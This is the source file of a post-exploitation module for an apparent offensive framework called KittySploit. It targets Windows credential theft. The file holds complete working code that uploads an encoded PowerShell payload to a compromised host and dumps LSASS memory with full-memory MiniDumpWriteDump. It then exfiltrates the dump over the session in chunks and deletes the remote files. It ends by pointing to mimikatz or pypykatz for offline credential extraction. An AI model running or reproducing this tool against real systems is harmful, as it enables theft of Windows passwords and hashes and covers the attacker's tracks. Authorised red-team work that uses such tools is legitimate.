#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Dump LSASS process memory via PowerShell MiniDumpWriteDump on a Windows shell or
Meterpreter session. The minidump is downloaded through the session and saved
under ./output.
"""

from kittysploit import *
import base64
import os
import re
import time

_LOCAL_OUT = "output"
_FILE_MARKER = "__KS_FILE__:"


class Module(Post):
    _AUTO_CLEANUP = True

    __info__ = {
        "name": "Windows LSASS Memory Dump",
        "description": (
            "Dump the LSASS process to a minidump file using PowerShell's internal "
            "MiniDumpWriteDump wrapper on a Windows shell or Meterpreter session, "
            "then download the dump through the session."
        ),
        "author": "KittySploit Team",
        "platform": Platform.WINDOWS,
        "session_type": [SessionType.METERPRETER, SessionType.SHELL],
        "references": [
            "https://attack.mitre.org/techniques/T1003/001/",
        ],
        "agent": {
            "risk": "intrusive",
            "effects": ["active_exploitation"],
            "expected_requests": 6,
            "reversible": False,
            "approval_required": True,
            "produces": ["risk_signals"],
        },
    }

    out_dir = OptString("", "Remote directory for lsass dump (default: %TEMP%)", False)
    chunk_kb = OptInteger(512, "Chunk size in kilobytes for session reads", False)

    def _execute_cmd(self, command: str) -> str:
        if not command:
            return ""
        output = self.cmd_execute(command)
        return output.strip() if output else ""

    def _encode_powershell(self, script: str) -> str:
        return base64.b64encode(script.encode("utf-16le")).decode("ascii")

    def _run_powershell(self, script: str) -> str:
        encoded = self._encode_powershell(script)
        return self._execute_cmd(f"powershell -NoP -NonI -EncodedCommand {encoded}")

    def _remote_temp_dir(self) -> str:
        if str(self.out_dir or "").strip():
            return str(self.out_dir).strip().rstrip("\\")
        output = self._execute_cmd("echo %TEMP%")
        if output:
            return output.splitlines()[0].strip().rstrip("\\")
        return "C:\\Windows\\Temp"

    def _ps_single_quote(self, value: str) -> str:
        return str(value).replace("'", "''")

    def _powershell_script(self) -> str:
        return r"""
function MemoryDump {
    [CmdletBinding()]
    param (
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True)]
        [System.Diagnostics.Process]$Process,

        [Parameter(Position = 1)]
        [string]$DumpFilePath
    )

    BEGIN {
        $WER = [PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting')
        $WERNativeMethods = $WER.GetNestedType('NativeMethods', 'NonPublic')
        $Flags = [Reflection.BindingFlags] 'NonPublic, Static'
        $MiniDumpWriteDump = $WERNativeMethods.GetMethod('MiniDumpWriteDump', $Flags)
        $MiniDumpWithFullMemory = [UInt32] 2
    }

    PROCESS {
        $ProcessId = $Process.Id
        $ProcessName = $Process.Name
        $ProcessHandle = $Process.Handle
        $ProcessFileName = "$($ProcessName)_$($ProcessId).dmp"
        $ProcessDumpPath = Join-Path -Path $DumpFilePath -ChildPath $ProcessFileName

        $FileStream = New-Object IO.FileStream($ProcessDumpPath, [IO.FileMode]::Create)
        $Result = $MiniDumpWriteDump.Invoke($null, @(
            $ProcessHandle,
            $ProcessId,
            $FileStream.SafeFileHandle,
            $MiniDumpWithFullMemory,
            [IntPtr]::Zero,
            [IntPtr]::Zero,
            [IntPtr]::Zero
        ))

        $FileStream.Close()

        if (-not $Result) {
            $Exception = New-Object ComponentModel.Win32Exception
            Remove-Item -Path $ProcessDumpPath -ErrorAction SilentlyContinue
            throw $Exception.Message
        }

        Get-Item -LiteralPath $ProcessDumpPath
    }
}

function Get-LSASSDump {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory = $True)]
        [string]$OutputDir
    )

    if (-not (Test-Path -LiteralPath $OutputDir)) {
        New-Item -ItemType Directory -Path $OutputDir -Force | Out-Null
    }

    $lsassProcess = Get-Process -Name lsass -ErrorAction Stop
    $dump = $lsassProcess | MemoryDump -DumpFilePath $OutputDir | Select-Object -First 1

    if (-not $dump) {
        throw "LSASS minidump was not created"
    }

    Write-Output "__KS_FILE__:$($dump.FullName)"
}
"""

    def _write_remote_script(self, temp_dir: str):
        script_path = f"{temp_dir}\\dump_lsass.ps1"
        blob_path = f"{temp_dir}\\dump_lsass.b64"
        payload = base64.b64encode(self._powershell_script().encode("utf-8")).decode("ascii")
        chunks = [payload[i:i + 3500] for i in range(0, len(payload), 3500)]

        for index, chunk in enumerate(chunks):
            method = "WriteAllText" if index == 0 else "AppendAllText"
            ps = f"[IO.File]::{method}('{blob_path}','{chunk}');"
            self._run_powershell(ps)

        decode_script = (
            f"$b=[IO.File]::ReadAllText('{blob_path}');"
            f"[IO.File]::WriteAllText('{script_path}',"
            "[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)));"
        )
        self._run_powershell(decode_script)
        return script_path, blob_path

    def _cleanup_remote(self, paths):
        for path in paths:
            if not path:
                continue
            self._execute_cmd(f'del /f /q "{path}"')

    def _int_opt(self, val, default, minimum=None):
        try:
            n = int(val)
        except Exception:
            n = default
        if minimum is not None and n < minimum:
            n = minimum
        return n

    def _remote_file_size(self, path: str) -> int:
        pq = self._ps_single_quote(path)
        ps = f"(Get-Item -LiteralPath '{pq}').Length"
        out = self._run_powershell(ps).strip()
        if not out:
            return 0
        tail = out.splitlines()[-1].strip()
        try:
            return int(tail)
        except ValueError:
            digits = re.sub(r"\D", "", tail)
            return int(digits) if digits else 0

    def _read_remote_chunk_b64(self, path: str, offset: int, length: int) -> bytes:
        pq = self._ps_single_quote(path)
        ps = f"""$fs = [IO.File]::OpenRead('{pq}')
try {{
  $null = $fs.Seek({int(offset)}, [IO.SeekOrigin]::Begin)
  $buf = New-Object byte[] {int(length)}
  $n = $fs.Read($buf, 0, {int(length)})
  if ($n -le 0) {{ '' }} else {{ [Convert]::ToBase64String($buf, 0, $n) }}
}} finally {{
  $fs.Close()
}}"""
        out = self._run_powershell(ps)
        clean = re.sub(r"\s+", "", out)
        if not clean:
            return b""
        return base64.b64decode(clean)

    def _pull_file_via_session(self, remote_path: str, local_path: str) -> bool:
        size = self._remote_file_size(remote_path)
        if size <= 0:
            print_error(f"Remote dump is missing or empty: {remote_path}")
            return False

        print_status(f"Downloading {size} bytes...")
        chunk = max(1024, self._int_opt(self.chunk_kb, 512, None) * 1024)
        parts = []
        offset = 0
        while offset < size:
            n = min(chunk, size - offset)
            blob = self._read_remote_chunk_b64(remote_path, offset, n)
            if len(blob) != n:
                print_error(f"Chunk read mismatch at offset {offset} (expected {n} bytes, got {len(blob)}).")
                return False
            parts.append(blob)
            offset += n
            if size > chunk:
                pct = int((offset * 100) / size)
                print_status(f"Download progress: {pct}%")

        parent = os.path.dirname(os.path.abspath(local_path))
        if parent:
            os.makedirs(parent, exist_ok=True)
        with open(local_path, "wb") as f:
            f.write(b"".join(parts))
        return True

    def _parse_remote_file(self, output: str) -> str:
        for line in output.splitlines():
            line = line.strip()
            if line.startswith(_FILE_MARKER):
                return line[len(_FILE_MARKER):].strip()
        return ""

    def check(self):
        ps_check = self._execute_cmd('powershell -NoP -Command "Write-Output 1"')
        if "1" not in ps_check:
            print_error("PowerShell is not available on the target")
            return False

        admin_check = self._run_powershell(
            "([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent())"
            ".IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)"
        )
        if "True" not in admin_check:
            print_error("Administrator or SYSTEM privileges are required to dump LSASS")
            whoami = self._execute_cmd("whoami")
            if whoami:
                print_warning(f"Current user: {whoami}")
            return False

        lsass_check = self._run_powershell(
            "if (Get-Process -Name lsass -ErrorAction SilentlyContinue) { '1' } else { '0' }"
        )
        if "1" not in lsass_check:
            print_error("LSASS process was not found on the target")
            return False

        print_success("Prerequisites confirmed (elevated session, LSASS running)")
        print_warning("This technique is likely to trigger AV/EDR detections")
        return True

    def run(self):
        if not self.check():
            raise ProcedureError(FailureType.NotAccess, "LSASS dump prerequisites not met")

        temp_dir = self._remote_temp_dir()
        stamp = time.strftime("%Y%m%d_%H%M%S")
        local_dir = os.path.join(_LOCAL_OUT, f"lsass_dump_{stamp}")
        os.makedirs(local_dir, exist_ok=True)

        print_status("Uploading Get-LSASSDump payload...")
        script_path, blob_path = self._write_remote_script(temp_dir)

        invoke = (
            "$ErrorActionPreference='Stop';"
            f". '{self._ps_single_quote(script_path)}';"
            f"Get-LSASSDump -OutputDir '{self._ps_single_quote(temp_dir)}'"
        )

        print_status("Dumping LSASS memory (this may take a while)...")
        result = self._run_powershell(invoke)

        cleanup_paths = [script_path, blob_path]
        remote_path = self._parse_remote_file(result)

        if not remote_path:
            if self._AUTO_CLEANUP:
                self._cleanup_remote(cleanup_paths)
            if re.search(r"(Exception|failed|Access is denied|Cannot find|LSASS)", result, re.I):
                print_error(result or "Get-LSASSDump failed without output")
                raise ProcedureError(FailureType.Unknown, "LSASS dump failed")
            raise ProcedureError(FailureType.Unknown, "No dump file path was returned")

        base = os.path.basename(remote_path.replace("\\", "/")) or "lsass.dmp"
        local_path = os.path.join(local_dir, base)

        if not self._pull_file_via_session(remote_path, local_path):
            if self._AUTO_CLEANUP:
                self._cleanup_remote(cleanup_paths + [remote_path])
            raise ProcedureError(FailureType.Unknown, f"Failed to download {remote_path}")

        if self._AUTO_CLEANUP:
            self._cleanup_remote(cleanup_paths + [remote_path])

        rel = os.path.join(".", local_path)
        print_success(f"LSASS dump saved: {rel} ({os.path.getsize(local_path)} bytes)")
        print_info("Offline extraction: pypykatz lsa minidump <dump>  or  mimikatz sekurlsa::minidump")
        return True
